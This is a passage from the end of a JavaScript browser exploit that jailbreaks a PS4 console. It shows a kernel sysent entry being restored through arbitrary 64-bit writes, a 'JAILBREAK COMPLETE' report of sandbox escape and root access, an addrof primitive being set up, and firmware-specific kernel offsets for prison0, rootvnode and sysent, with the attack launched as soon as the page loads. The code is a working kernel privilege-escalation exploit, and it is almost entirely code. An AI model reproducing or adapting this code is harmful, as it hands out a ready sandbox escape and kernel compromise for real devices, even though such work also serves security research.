        write64(sysent_661 + 8n, sy_call);
        write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
        mark("SYSENT-RESTORED", "success");

        mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified);

    } catch (error) {
        mark("JAILBREAK-ERROR", error.message);
    }
}

/* ============================================================
 *  SINGLE-SHOT ENTRY
 * ============================================================ */
var attemptSucceeded = false;

function runAttempt() {
    mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-post=" + (RUN_JAILBREAK ? "jb" : "probe"));
    try {
        buildAndStoreGraph();
        prepareAddrof();
    } catch (error) {
        mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
        failTerminal("setup");
    }
}

/* ============================================================
 *  BOOT
 * ============================================================ */
buildDashboard();

try {
    document.getElementById("toolbarMeta").textContent =
        "rev " + REVISION + " · fw " + (FW_LABEL || "?") + " · post " + (RUN_JAILBREAK ? "JB" : "PROBE");
} catch (_) {}

(function seedFirmwareCard() {
    setRow("fw", "label", FW_LABEL || "(undetected)", FW_LABEL ? "ok" : "warn");
    setRow("fw", "ua",    navigator.userAgent);
    setRow("fw", "rev",   REVISION);
    if (FW_LABEL && fwOffsets) {
        setRow("fw", "off-evf",     "0x" + fwOffsets.evf.toString(16));
        setRow("fw", "off-prison0", "0x" + fwOffsets.prison0.toString(16));
        setRow("fw", "off-root",    "0x" + fwOffsets.rootvnode.toString(16));
        setRow("fw", "off-sysent",  "0x" + fwOffsets.sysent.toString(16));
        setRow("fw", "off-jmp",     "0x" + fwOffsets.jmp.toString(16));
        setBadge("fw", "OK", "ok");
        setCardState("fw", "ok");
    } else {
        setBadge("fw", "UNKNOWN", "warn");
        setCardState("fw", "warn");
    }
})();

runAttempt();
